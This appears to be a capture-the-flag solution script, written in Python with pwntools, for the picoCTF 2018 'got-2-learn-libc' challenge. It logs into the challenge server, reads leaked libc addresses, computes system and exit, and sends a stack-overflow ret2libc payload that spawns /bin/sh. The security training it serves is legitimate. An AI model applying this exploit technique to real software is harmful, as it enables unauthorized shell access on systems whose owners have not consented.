#!/usr/bin/python
from pwn import *
import struct


user = 'XXXXX'
pw = 'XXXXX'

s = ssh(host = '2018shell4.picoctf.com', user=user, password=pw)
s.set_working_directory('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33')

r = s.process('./vuln')                       # binary name
libc = ELF('/lib/i386-linux-gnu/libc.so.6')     # libc name


offset = -149504
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']

r.recvuntil('puts: ')
puts_addr = r.recvuntil("\n")
print puts_addr
r.recvuntil('read: ')
read_addr = int(r.recv(10), 16)
r.recvuntil('useful_string: ')
binsh_addr = int(r.recv(10), 16)
#binsh_addr = r.recvuntil("\n")

libc_base = read_addr - read_offset
system_ad = libc_base + system_offset
system_addr = int(puts_addr, 16) + offset
exit_addr = libc_base + exit_offset

print int(puts_addr, 16)
print 'exit addr = ', hex(exit_addr)

print 'puts addr = ', puts_addr
print 'read addr = ', hex(read_addr)

print '/bin/sh addr = ', hex(binsh_addr)
print 'system ad = ', hex(system_ad)
print 'system addr = ', hex(system_addr)

payload = "A"*160
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)
#payload += struct.pack("I", int(binsh_addr, 16))

r.sendline(payload)
#pause()
r.interactive()
#r.recv()
#r.sendline('ls')
#r.sendline('cat flag.txt')
#r.sendline('exit')


#print r.recvall()
